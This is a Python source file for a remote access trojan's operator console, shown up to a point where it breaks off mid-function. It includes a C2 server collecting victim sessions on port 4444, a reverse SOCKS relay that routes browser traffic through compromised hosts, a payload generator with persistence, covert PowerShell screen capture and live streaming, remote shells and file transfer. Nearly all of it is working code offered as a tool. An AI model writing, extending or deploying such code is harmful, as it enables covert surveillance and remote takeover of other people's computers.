#!/usr/bin/env python3
"""
RAT - Remote Administration Tool
Based on proven server.py architecture with ALL features
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
import socket
import threading
import json
import os
import subprocess
import platform
import time
import uuid
import base64
import io
from datetime import datetime
import select
import struct
from queue import Queue

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Colors
class Colors:
    BG = "#0d1117"
    SURFACE = "#161b22"
    BORDER = "#30363d"
    PRIMARY = "#58a6ff"
    SUCCESS = "#3fb950"
    WARNING = "#f85149"
    TEXT = "#f0f6fc"
    MUTED = "#7d8590"

class ReverseSocksRelay:
    """Reverse SOCKS5 Relay Server (based on tsocks)"""
    
    def __init__(self, cmd_port=8001, client_port=8002):
        self.cmd_port = cmd_port
        self.client_port = client_port
        self.running = False
        self.sock_s = None # Socket for RDP reverse connection (Command Channel)
        self.sock_c = None # Socket for Chrome connections (SOCKS Tunnel)
        self.con_cmd = None # Established command connection
        self.pending_socks = Queue() # Queue to pair Chrome connection with RDP tunnel
        
    def start(self):
        """Start relay server"""
        try:
            # Socket for RDP reverse connection (Command Channel - 8001)
            self.sock_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock_s.bind(("0.0.0.0", self.cmd_port))
            self.sock_s.listen(100)
            
            # Socket for Chrome connections (SOCKS Tunnel - 8002)
            # This port will accept both the local Chrome connection AND the remote client's tunnel connection
            self.sock_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock_c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock_c.bind(("0.0.0.0", self.client_port))
            self.sock_c.listen(100)
            
            self.running = True
            threading.Thread(target=self.relay_loop, daemon=True).start()
            return True
        except Exception as e:
            print(f"[ERROR] Failed to start relay: {e}")
            return False
    
    def relay_loop(self):
        """
        Main relay loop.
        sock_s (8001) is for the RDP command channel.
        sock_c (8002) is for the SOCKS tunnel (both local Chrome and remote client tunnel).
        """
        
        inputs = [self.sock_s, self.sock_c]
        
        while self.running:
            try:
                rs, ws, es = select.select(inputs, [], [], 1)
                
                # 1. Handle new RDP Command Connection (8001)
                if self.sock_s in rs:
                    # Only accept one command connection at a time
                    if not self.con_cmd:
                        con_s, addr = self.sock_s.accept()
                        self.con_cmd = con_s
                        print(f"[DEBUG] RDP command connected from {addr} on {self.cmd_port}")
                    else:
                        # Reject extra command connections
                        con_s, addr = self.sock_s.accept()
                        con_s.close()
                        print(f"[DEBUG] Rejected extra RDP command connection from {addr}")
                
                # 2. Handle new SOCKS Tunnel Connection (8002)
                if self.sock_c in rs:
                    con_new, addr = self.sock_c.accept()
                    print(f"[DEBUG] New connection from {addr} on {self.client_port}")
                    
                    if not self.con_cmd:
                        print("[DEBUG] ERROR: No RDP command socket! Closing new connection.")
                        con_new.close()
                        continue
                        
                    # Check if this is the local Chrome SOCKS request (first connection)
                    # or the remote client's tunnel (second connection).
                    
                    if self.pending_socks.empty():
                        # This is the local Chrome connection (con_c in original code)
                        # We need to signal the remote client to connect back.
                        
                        # 1. Store the local Chrome connection
                        self.pending_socks.put(con_new)
                        print("[DEBUG] Local Chrome connection queued. Signaling RDP client.")
                        
                        # 2. Signal the remote client over the command channel
                        try:
                            # The remote client (tsmin_py3.py) must be listening for this "ok"
                            # and then initiate a new connection to 8002.
                            self.con_cmd.send(b"ok")
                            print("[DEBUG] Sent 'ok' signal to RDP command channel.")
                        except Exception as e:
                            print(f"[DEBUG] Failed to send 'ok' signal: {e}. Closing queued socket.")
                            con_new.close()
                            self.pending_socks.get() # Remove from queue
                            continue
                            
                    else:
                        # This is the remote client's tunnel connection (con_s_tun in original code)
                        # Pair it with the queued local Chrome connection.
                        con_c = self.pending_socks.get()
                        con_s_tun = con_new
                        
                        print(f"[DEBUG] RDP tunnel socket from {addr} accepted.")
                        
                        # Start forwarding data
                        threading.Thread(target=self.forward_data, 
                                       args=(con_s_tun, con_c), daemon=True).start()
                        print("[DEBUG] Data forwarding started.")

            except Exception as e:
                if self.running:
                    print(f"[DEBUG] Relay loop error: {e}")
                else:
                    break
    
    def forward_data(self, s, c):
        """Forward data - EXACT tsocks_py3.py forward_translate logic"""
        # ... (Rest of the forward_data method remains the same) ...
        import select
        print("[DEBUG] Starting data forwarding...")
        try:
            conlist = [c, s]
            while True:
                r, w, e = select.select(conlist, [], [])
                if c in r:
                    data = c.recv(4096)
                    if not data or s.send(data) <= 0:
                        c.close()
                        s.close()
                        print(f"[DEBUG] Chrome closed/error")
                        break
                    print(f"[DEBUG] Chrome→RDP: {len(data)} bytes")
                if s in r:
                    data = s.recv(4096)
                    if not data or c.send(data) <= 0:
                        s.close()
                        c.close()
                        print(f"[DEBUG] RDP closed/error")
                        break
                    print(f"[DEBUG] RDP→Chrome: {len(data)} bytes")
        except Exception as e:
            print(f"[DEBUG] Forward error: {e}")
            try:
                s.close()
            except:
                pass
            try:
                c.close()
            except:
                pass
    
    def stop(self):
        """Stop relay"""
        self.running = False
        try:
            if self.sock_s:
                self.sock_s.close()
            if self.sock_c:
                self.sock_c.close()
            if self.con_cmd:
                self.con_cmd.close()
        except:
            pass

class RATServer:
    """Server based on proven server.py architecture"""
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.sessions = {}
        self.session_counter = 0
        self.running = False
        
    def start_server(self):
        """Start listening for incoming connections"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            threading.Thread(target=self.accept_connections, daemon=True).start()
            return True
        except Exception as e:
            return str(e)
    
    def accept_connections(self):
        """Accept incoming connections from targets"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                
                # Receive system info (server.py protocol)
                data = client_socket.recv(4096).decode('utf-8')
                if data:
                    system_info = json.loads(data)
                    
                    self.session_counter += 1
                    session_id = f"session_{self.session_counter}"
                    
                    self.sessions[session_id] = {
                        'socket': client_socket,
                        'address': address,
                        'info': system_info,
                        'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    if hasattr(self, 'gui_callback'):
                        self.gui_callback('new_session', session_id)
                        
            except Exception as e:
                if self.running:
                    print(f"Error accepting connection: {e}")
    
    def send_command(self, session_id, command, timeout=10, large_data=False):
        """Send command to specific session (server.py protocol)"""
        if session_id not in self.sessions:
            return None
        
        try:
            sock = self.sessions[session_id]['socket']
            
            # Send command
            cmd_data = json.dumps({'cmd': command})
            sock.sendall(cmd_data.encode('utf-8') + b'\n')
            
            # Receive response
            response = b""
            sock.settimeout(timeout if not large_data else 60)
            buffer_size = 65536 if large_data else 4096
            
            while True:
                try:
                    chunk = sock.recv(buffer_size)
                    if not chunk:
                        break
                    response += chunk
                    if b'<<<END>>>' in response:
                        response = response.replace(b'<<<END>>>', b'')
                        break
                except socket.timeout:
                    break
            
            return response.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def close_session(self, session_id):
        """Close specific session"""
        if session_id in self.sessions:
            try:
                self.sessions[session_id]['socket'].close()
            except:
                pass
            del self.sessions[session_id]
    
    def stop_server(self):
        """Stop the server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        for session_id in list(self.sessions.keys()):
            self.close_session(session_id)

class RATGUI:
    """RAT GUI with ALL features"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("RAT - Remote Administration Tool")
        self.root.geometry("1400x900")
        self.root.configure(bg=Colors.BG)
        
        self.server = RATServer()
        self.server.gui_callback = self.handle_server_event
        self.current_session = None
        self.livestream_active = False
        self.livestream_window = None
        self.terminal_windows = []  # For multi-terminal
        self.chrome_proxy = None  # Chrome proxy tunnel
        self.chrome_process = None  # Chrome process
        
        self.create_ui()
    
    def create_ui(self):
        """Create UI"""
        # Top bar
        top_frame = tk.Frame(self.root, bg=Colors.SURFACE, height=60)
        top_frame.pack(fill="x", padx=10, pady=10)
        top_frame.pack_propagate(False)
        
        tk.Label(top_frame, text="Port:", bg=Colors.SURFACE, fg=Colors.TEXT, 
                font=("Consolas", 10)).pack(side="left", padx=(10, 5))
        
        self.port_var = tk.StringVar(value="4444")
        tk.Entry(top_frame, textvariable=self.port_var, width=8, bg=Colors.BG, fg=Colors.TEXT,
                font=("Consolas", 10)).pack(side="left", padx=(0, 10))
        
        tk.Button(top_frame, text="START", command=self.start_server,
                 bg=Colors.SUCCESS, fg="white", relief="flat", font=("Consolas", 9, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)
        
        tk.Button(top_frame, text="STOP", command=self.stop_server,
                 bg=Colors.WARNING, fg="white", relief="flat", font=("Consolas", 9, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)
        
        tk.Button(top_frame, text="GENERATE", command=self.generate_payload,
                 bg=Colors.PRIMARY, fg="white", relief="flat", font=("Consolas", 9, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)
        
        self.status_label = tk.Label(top_frame, text="OFFLINE", bg=Colors.SURFACE, 
                                     fg=Colors.WARNING, font=("Consolas", 10, "bold"))
        self.status_label.pack(side="right", padx=10)
        
        # Main content
        content = tk.Frame(self.root, bg=Colors.BG)
        content.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        # Left: Sessions
        left = tk.Frame(content, bg=Colors.SURFACE, width=350)
        left.pack(side="left", fill="y", padx=(0, 5))
        left.pack_propagate(False)
        
        tk.Label(left, text="SESSIONS", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 11, "bold")).pack(pady=10)
        
        # Session buttons
        btn_frame = tk.Frame(left, bg=Colors.SURFACE)
        btn_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Button(btn_frame, text="REFRESH", command=self.refresh_sessions,
                 bg=Colors.PRIMARY, fg="white", relief="flat", font=("Consolas", 8),
                 padx=10).pack(side="left", padx=2)
        
        tk.Button(btn_frame, text="DELETE", command=self.delete_session,
                 bg=Colors.WARNING, fg="white", relief="flat", font=("Consolas", 8),
                 padx=10).pack(side="left", padx=2)
        
        # Second row buttons
        btn_frame2 = tk.Frame(left, bg=Colors.SURFACE)
        btn_frame2.pack(fill="x", padx=10, pady=5)
        
        tk.Button(btn_frame2, text="📷", command=self.take_screenshot,
                 bg="#e67e22", fg="white", relief="flat", font=("Consolas", 10),
                 width=3).pack(side="left", padx=2)
        
        self.live_btn = tk.Button(btn_frame2, text="▶", command=self.toggle_livestream,
                                  bg="#9b59b6", fg="white", relief="flat", font=("Consolas", 10),
                                  width=3)
        self.live_btn.pack(side="left", padx=2)
        
        tk.Button(btn_frame2, text="📁", command=self.open_file_manager,
                 bg="#3498db", fg="white", relief="flat", font=("Consolas", 10),
                 width=3).pack(side="left", padx=2)
        
        tk.Button(btn_frame2, text="+TERM", command=self.new_terminal,
                 bg="#2ecc71", fg="white", relief="flat", font=("Consolas", 10),
                 width=3).pack(side="left", padx=2)
        
        tk.Button(btn_frame2, text="🌐 PROXY", command=self.launch_chrome_proxy,
                 bg="#f39c12", fg="white", relief="flat", font=("Consolas", 10),
                 width=5).pack(side="left", padx=2)
        
        # Session list
        self.session_tree = ttk.Treeview(left, columns=("ip", "os", "user", "time"), 
                                        show="headings", selectmode="browse")
        self.session_tree.heading("ip", text="IP")
        self.session_tree.heading("os", text="OS")
        self.session_tree.heading("user", text="User")
        self.session_tree.heading("time", text="Time")
        
        self.session_tree.column("ip", width=100, anchor="center")
        self.session_tree.column("os", width=60, anchor="center")
        self.session_tree.column("user", width=60, anchor="center")
        self.session_tree.column("time", width=100, anchor="center")
        
        self.session_tree.bind("<<TreeviewSelect>>", self.on_session_select)
        self.session_tree.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Right: Log/Details
        right = tk.Frame(content, bg=Colors.SURFACE)
        right.pack(side="right", fill="both", expand=True)
        
        # Notebook for tabs
        self.notebook = ttk.Notebook(right)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Log tab
        log_frame = tk.Frame(self.notebook, bg=Colors.BG)
        self.notebook.add(log_frame, text=" Log ")
        
        self.log_text = scrolledtext.ScrolledText(log_frame, bg=Colors.BG, fg=Colors.TEXT,
                                                font=("Consolas", 9), relief="flat",
                                                insertbackground=Colors.PRIMARY)
        self.log_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Details tab
        details_frame = tk.Frame(self.notebook, bg=Colors.BG)
        self.notebook.add(details_frame, text=" Details ")
        
        self.details_text = scrolledtext.ScrolledText(details_frame, bg=Colors.BG, fg=Colors.TEXT,
                                                    font=("Consolas", 9), relief="flat",
                                                    insertbackground=Colors.PRIMARY)
        self.details_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.log("RAT Server initialized.")
        
        # Style for Treeview
        style = ttk.Style()
        style.theme_use("default")
        style.configure("Treeview", background=Colors.SURFACE, foreground=Colors.TEXT, 
                        fieldbackground=Colors.SURFACE, borderwidth=0, font=("Consolas", 9))
        style.map("Treeview", background=[('selected', Colors.PRIMARY)])
        style.configure("Treeview.Heading", background=Colors.SURFACE, foreground=Colors.PRIMARY,
                        font=("Consolas", 9, "bold"))
        style.configure("TNotebook", background=Colors.SURFACE, borderwidth=0)
        style.configure("TNotebook.Tab", background=Colors.SURFACE, foreground=Colors.TEXT, 
                        font=("Consolas", 9))
        style.map("TNotebook.Tab", background=[('selected', Colors.BG)], 
                  foreground=[('selected', Colors.PRIMARY)])
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
    def on_closing(self):
        """Handle window closing"""
        if self.chrome_proxy:
            self.chrome_proxy.stop()
        if self.chrome_process:
            self.chrome_process.terminate()
        self.server.stop_server()
        self.root.destroy()
        
    def log(self, message, level="INFO"):
        """Log message to the log window"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "SUCCESS":
            tag = "success"
            color = Colors.SUCCESS
        elif level == "ERROR":
            tag = "error"
            color = Colors.WARNING
        elif level == "INFO":
            tag = "info"
            color = Colors.TEXT
        else:
            tag = "debug"
            color = Colors.MUTED
            
        self.log_text.insert("end", f"[{timestamp}] [{level}] {message}\n", tag)
        self.log_text.tag_config(tag, foreground=color)
        self.log_text.see("end")
        
    def start_server(self):
        """Start the RAT server"""
        try:
            port = int(self.port_var.get())
            self.server = RATServer(port=port)
            self.server.gui_callback = self.handle_server_event
            result = self.server.start_server()
            
            if result is True:
                self.status_label.config(text=f"LISTENING on port {port}", fg=Colors.SUCCESS)
                self.log(f"Server started successfully on port {port}", "SUCCESS")
            else:
                self.status_label.config(text="ERROR", fg=Colors.WARNING)
                self.log(f"Failed to start server: {result}", "ERROR")
                
        except ValueError:
            self.log("Invalid port number", "ERROR")
        
    def stop_server(self):
        """Stop the RAT server"""
        if self.chrome_proxy:
            self.chrome_proxy.stop()
            self.chrome_proxy = None
        if self.chrome_process:
            self.chrome_process.terminate()
            self.chrome_process = None
            
        self.server.stop_server()
        self.status_label.config(text="OFFLINE", fg=Colors.WARNING)
        self.log("Server stopped.", "INFO")
        self.refresh_sessions()
        
    def generate_payload(self):
        """Generate payload with blockchain persistence"""
        from payload_generator import PayloadGenerator
        
        # Get configuration from user
        server_ip = simpledialog.askstring("Server IP", "Enter server IP address:", 
                                          initialvalue="127.0.0.1")
        if not server_ip:
            return
        
        server_port = simpledialog.askinteger("Server Port", "Enter server port:", 
                                             initialvalue=self.port)
        if not server_port:
            return
        
        output_file = filedialog.asksaveasfilename(
            title="Save Payload As",
            defaultextension=".py",
            filetypes=[("Python Files", "*.py"), ("All Files", "*.*")]
        )
        
        if not output_file:
            return
        
        try:
            # Generate payload
            gen = PayloadGenerator()
            result = gen.generate_payload(
                server_ip=server_ip,
                server_port=server_port,
                output_file=output_file,
                persistence=True,
                blockchain_enabled=True,
                blockchain_host=server_ip,
                blockchain_port=5444
            )
            
            self.log(f"Payload generated successfully!", "SUCCESS")
            self.log(f"Session ID: {result['session_id']}", "INFO")
            self.log(f"Output: {result['output_file']}", "INFO")
            self.log(f"Blockchain: {result['blockchain_enabled']}", "INFO")
            
            messagebox.showinfo(
                "Payload Generated",
                f"Payload generated successfully!\n\n"
                f"Session ID: {result['session_id']}\n"
                f"File: {result['output_file']}\n\n"
                f"Blockchain persistence enabled.\n"
                f"Start blockchain server on port 5444."
            )
            
        except Exception as e:
            self.log(f"Failed to generate payload: {e}", "ERROR")
            messagebox.showerror("Error", f"Failed to generate payload:\n{e}")
        
    def handle_server_event(self, event_type, data):
        """Handle events from the server thread"""
        if event_type == 'new_session':
            self.root.after(0, self.refresh_sessions)
            self.log(f"New session connected: {data}", "SUCCESS")
            
    def refresh_sessions(self):
        """Refresh the session list in the GUI"""
        self.session_tree.delete(*self.session_tree.get_children())
        for session_id, data in self.server.sessions.items():
            info = data['info']
            self.session_tree.insert("", "end", iid=session_id, 
                                     values=(data['address'][0], 
                                             info.get('os', 'N/A'), 
                                             info.get('user', 'N/A'), 
                                             data['connected_at']))
            
    def delete_session(self):
        """Delete selected session"""
        selected_item = self.session_tree.focus()
        if selected_item:
            session_id = self.session_tree.item(selected_item)['text']
            self.server.close_session(session_id)
            self.log(f"Session {session_id} closed.", "INFO")
            self.refresh_sessions()
            
    def on_session_select(self, event):
        """Handle session selection"""
        selected_item = self.session_tree.focus()
        if selected_item:
            session_id = self.session_tree.item(selected_item)['text']
            self.current_session = session_id
            self.log(f"Selected session: {session_id}", "INFO")
            self.show_session_details(session_id)
        else:
            self.current_session = None
            self.details_text.delete(1.0, "end")
            
    def show_session_details(self, session_id):
        """Show details of the selected session"""
        self.details_text.delete(1.0, "end")
        if session_id in self.server.sessions:
            data = self.server.sessions[session_id]
            details = f"Session ID: {session_id}\n"
            details += f"IP Address: {data['address'][0]}:{data['address'][1]}\n"
            details += f"Connected At: {data['connected_at']}\n\n"
            details += "System Information:\n"
            
            for key, value in data['info'].items():
                details += f"  {key.replace('_', ' ').title()}: {value}\n"
                
            self.details_text.insert("end", details)
            
    def take_screenshot(self):
        """Take screenshot command"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        self.log("Requesting screenshot...", "INFO")
        
        def capture():
            # Powershell command to capture screen and base64 encode it
            ps_cmd = 'powershell -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $screens = [Windows.Forms.Screen]::AllScreens; $bounds = $screens[0].Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $ms = New-Object IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())"'
            
            result = self.server.send_command(self.current_session, ps_cmd, timeout=30, large_data=True)
            
            if result and len(result) > 100 and PIL_AVAILABLE:
                try:
                    # Fix padding
                    result = result.strip()
                    padding = len(result) % 4
                    if padding:
                        result += '=' * (4 - padding)
                    
                    img_data = base64.b64decode(result)
                    image = Image.open(io.BytesIO(img_data))
                    
                    self.root.after(0, lambda: self._show_image(image, f"Screenshot - {self.current_session}"))
                    self.root.after(0, lambda: self.log("Screenshot received and displayed.", "SUCCESS"))
                    
                except Exception as e:
                    self.root.after(0, lambda: self.log(f"Failed to process image: {e}", "ERROR"))
            else:
                self.root.after(0, lambda: self.log("Failed to receive valid screenshot data.", "ERROR"))
                
        threading.Thread(target=capture, daemon=True).start()
        
    def toggle_livestream(self):
        """Toggle livestream"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        if not self.livestream_active:
            self.livestream_active = True
            self.live_btn.config(text="⏸", bg="#e74c3c")
            self.log("Livestream started", "SUCCESS")
            self._create_livestream_window()
            self._livestream_loop()
        else:
            self.livestream_active = False
            self.live_btn.config(text="▶", bg="#9b59b6")
            self.log("Livestream stopped")
            if self.livestream_window:
                self.livestream_window.destroy()
                self.livestream_window = None
    
    def _create_livestream_window(self):
        """Create livestream window"""
        if self.livestream_window:
            return
        
        self.livestream_window = tk.Toplevel(self.root)
        self.livestream_window.title("Live Stream")
        self.livestream_window.geometry("1000x700")
        self.livestream_window.configure(bg=Colors.BG)
        self.livestream_window.protocol("WM_DELETE_WINDOW", self.toggle_livestream)
        
        self.livestream_label = tk.Label(self.livestream_window, bg=Colors.BG)
        self.livestream_label.pack(expand=True)
    
    def _livestream_loop(self):
        """Livestream loop"""
        if not self.livestream_active:
            return
        
        threading.Thread(target=self._capture_livestream_frame, daemon=True).start()
        self.root.after(1000, self._livestream_loop)
    
    def _capture_livestream_frame(self):
        """Capture livestream frame"""
        ps_cmd = 'powershell -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $screens = [Windows.Forms.Screen]::AllScreens; $bounds = $screens[0].Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $ms = New-Object IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())"'
        
        result = self.server.send_command(self.current_session, ps_cmd, timeout=30, large_data=True)
        
        if result and len(result) > 100 and PIL_AVAILABLE and self.livestream_window:
            try:
                # Fix padding
                result = result.strip()
                padding = len(result) % 4
                if padding:
                    result += '=' * (4 - padding)
                
                img_data = base64.b64decode(result)
                image = Image.open(io.BytesIO(img_data))
                
                # Resize to fit
                max_w, max_h = 980, 680
                img_w, img_h = image.size
                if img_w > max_w or img_h > max_h:
                    ratio = min(max_w/img_w, max_h/img_h)
                    image = image.resize((int(img_w*ratio), int(img_h*ratio)), Image.Resampling.LANCZOS)
                
                photo = ImageTk.PhotoImage(image)
                self.livestream_label.config(image=photo)
                self.livestream_label.image = photo
                
            except:
                pass
    
    def _show_image(self, image, title):
        """Show image"""
        window = tk.Toplevel(self.root)
        window.title(title)
        window.geometry("900x700")
        window.configure(bg=Colors.BG)
        
        # Resize
        max_w, max_h = 880, 680
        img_w, img_h = image.size
        if img_w > max_w or img_h > max_h:
            ratio = min(max_w/img_w, max_h/img_h)
            image = image.resize((int(img_w*ratio), int(img_h*ratio)), Image.Resampling.LANCZOS)
        
        photo = ImageTk.PhotoImage(image)
        label = tk.Label(window, image=photo, bg=Colors.BG)
        label.image = photo
        label.pack(expand=True)
    
    def new_terminal(self):
        """Open new independent terminal window"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        term_num = len(self.terminal_windows) + 1
        
        term_win = tk.Toplevel(self.root)
        term_win.title(f"Terminal #{term_num} - {self.current_session}")
        term_win.geometry("800x500")
        term_win.configure(bg=Colors.BG)
        
        # Store session ID and INDEPENDENT directory for this terminal
        term_win.session_id = self.current_session
        term_win.terminal_id = f"term_{term_num}_{int(time.time())}"
        term_win.current_dir = None  # Will be set after first command
        
        # Top bar with terminal info
        top_bar = tk.Frame(term_win, bg=Colors.SURFACE, height=35)
        top_bar.pack(fill="x")
        top_bar.pack_propagate(False)
        
        tk.Label(top_bar, text=f"🖥 Terminal #{term_num}", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 10, "bold")).pack(side="left", padx=10)
        
        tk.Label(top_bar, text=f"Session: {self.current_session}", bg=Colors.SURFACE, fg=Colors.MUTED,
                font=("Consolas", 9)).pack(side="left", padx=10)
        
        # Directory indicator (updates dynamically)
        dir_label = tk.Label(top_bar, text="📁 Detecting...", bg=Colors.SURFACE, fg="#3498db",
                            font=("Consolas", 8))
        dir_label.pack(side="left", padx=10)
        
        # Update directory display
        def update_dir_display():
            if term_win.winfo_exists() and term_win.current_dir:
                dir_label.config(text=f"📁 {term_win.current_dir}")
            if term_win.winfo_exists():
                term_win.after(1000, update_dir_display)
        
        term_win.after(1000, update_dir_display)
        
        tk.Button(top_bar, text="🗑 CLEAR", command=lambda: terminal.delete(1.0, "end"),
                 bg=Colors.WARNING, fg="white", relief="flat", font=("Consolas", 8),
                 padx=10).pack(side="right", padx=5)
        
        # Terminal output - INDEPENDENT for this window
        terminal = scrolledtext.ScrolledText(term_win, bg=Colors.BG, fg=Colors.TEXT,
                                            font=("Consolas", 9), relief="flat",
                                            insertbackground=Colors.PRIMARY, wrap="word")
        terminal.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Show welcome message
        terminal.insert("end", f"╔════════════════════════════════════════╗\n")
        terminal.insert("end", f"║   NEW TERMINAL SESSION #{term_num}            ║\n")
        terminal.insert("end", f"║   Session: {self.current_session}                ║\n")
        terminal.insert("end", f"║   Independent command execution       ║\n")
        terminal.insert("end", f"╚════════════════════════════════════════╝\n\n")
        
        # Command input
        cmd_frame = tk.Frame(term_win, bg=Colors.SURFACE)
        cmd_frame.pack(fill="x", padx=10, pady=(0, 10))
        
        tk.Label(cmd_frame, text="$", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 11, "bold")).pack(side="left", padx=(0, 5))
        
        cmd_var = tk.StringVar()
        cmd_entry = tk.Entry(cmd_frame, textvariable=cmd_var, bg=Colors.BG, 
                            fg=Colors.TEXT, font=("Consolas", 10), relief="flat",
                            insertbackground=Colors.PRIMARY)
        cmd_entry.pack(side="left", fill="x", expand=True)
        
        # Command history for THIS terminal only
        cmd_history = []
        history_index = [0]
        
        def send_cmd(event=None):
            cmd = cmd_var.get().strip()
            if not cmd:
                return
            
            # Add to this terminal's history
            cmd_history.append(cmd)
            history_index[0] = len(cmd_history)
            
            cmd_var.set("")
            timestamp = datetime.now().strftime("%H:%M:%S")
            terminal.insert("end", f"[{timestamp}] $ {cmd}\n", "command")
            terminal.tag_config("command", foreground=Colors.PRIMARY)
            terminal.see("end")
            
            # Execute command INDEPENDENTLY - payload handles separation
            def exec_cmd():
                # Check if terminal still exists
                if not term_win.winfo_exists():
                    return
                
                # Send command with terminal ID prefix
                prefixed_cmd = f"TERMID:{term_win.terminal_id}:{cmd}"
                result = self.server.send_command(term_win.session_id, prefixed_cmd, timeout=30)
                
                # Update current_dir display from result
                if result and "Changed to:" in result:
                    try:
                        term_win.current_dir = result.split("Changed to:")[1].strip().split("\n")[0]
                    except:
                        pass
                elif not term_win.current_dir and result and "Directory of " in result:
                    try:
                        term_win.current_dir = result.split("Directory of ")[1].split("\n")[0].strip()
                    except:
                        pass
                
                if result and term_win.winfo_exists():
                    term_win.after(0, lambda: terminal.insert("end", result.strip() + "\n", "output"))
                    term_win.after(0, lambda: terminal.tag_config("output", foreground=Colors.TEXT))
                    term_win.after(0, lambda: terminal.see("end"))
            
            threading.Thread(target=exec_cmd, daemon=True).start()
        
        def on_up_arrow(event):
            if cmd_history and history_index[0] > 0:
                history_index[0] -= 1
                cmd_var.set(cmd_history[history_index[0]])
                cmd_entry.icursor("end")
                return "break"
        
        def on_down_arrow(event):
            if cmd_history and history_index[0] < len(cmd_history) - 1:
                history_index[0] += 1
                cmd_var.set(cmd_history[history_index[0]])
                cmd_entry.icursor("end")
            elif history_index[0] == len(cmd_history) - 1:
                history_index[0] = len(cmd_history)
                cmd_var.set("")
            return "break"
        
        cmd_entry.bind("<Return>", send_cmd)
        cmd_entry.bind("<Up>", on_up_arrow)
        cmd_entry.bind("<Down>", on_down_arrow)
        cmd_entry.focus()
        
        # Clean up on close
        def on_close():
            if term_win in self.terminal_windows:
                self.terminal_windows.remove(term_win)
            term_win.destroy()
        
        term_win.protocol("WM_DELETE_WINDOW", on_close)
        
        self.terminal_windows.append(term_win)
        self.log(f"New independent terminal #{term_num} opened for {self.current_session}")
        
    def open_file_manager(self):
        """Open file manager"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        fm_win = tk.Toplevel(self.root)
        fm_win.title(f"File Manager - {self.current_session}")
        fm_win.geometry("1200x700")
        fm_win.configure(bg="#ffffff")
        
        # Top bar
        top_bar = tk.Frame(fm_win, bg="#f8f9fa", height=50)
        top_bar.pack(fill="x")
        top_bar.pack_propagate(False)
        
        tk.Label(top_bar, text="File Manager", bg="#f8f9fa", fg="#2c3e50",
                font=("Segoe UI", 12, "bold")).pack(side="left", padx=15, pady=10)
        
        tk.Button(top_bar, text="↻ Refresh", command=lambda: self._refresh_file_manager(fm_win),
                 bg="#3498db", fg="white", relief="flat", font=("Segoe UI", 9),
                 padx=15, pady=5).pack(side="right", padx=5)
        
        # Main content
        content = tk.Frame(fm_win, bg="#ffffff")
        content.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Local files (left)
        local_frame = tk.Frame(content, bg="#ffffff")
        local_frame.pack(side="left", fill="both", expand=True, padx=(0, 5))
        
        tk.Label(local_frame, text="📁 Local Files", bg="#ffffff", fg="#2c3e50",
                font=("Segoe UI", 10, "bold")).pack(pady=5)
        
        local_tree = ttk.Treeview(local_frame, columns=("size", "modified"), 
                                 show="tree headings", height=25)
        local_tree.heading("#0", text="Name")
        local_tree.heading("size", text="Size")
        local_tree.heading("modified", text="Modified")
        local_tree.column("#0", width=250)
        local_tree.column("size", width=100)
        local_tree.column("modified", width=150)
        local_tree.pack(fill="both", expand=True)
        
        # Middle buttons
        mid_frame = tk.Frame(content, bg="#ffffff", width=80)
        mid_frame.pack(side="left", fill="y", padx=10)
        mid_frame.pack_propagate(False)
        
        tk.Label(mid_frame, text="", bg="#ffffff").pack(pady=50)
        
        tk.Button(mid_frame, text="➡\nUPLOAD", 
                 command=lambda: self._file_upload(local_tree, remote_tree, fm_win),
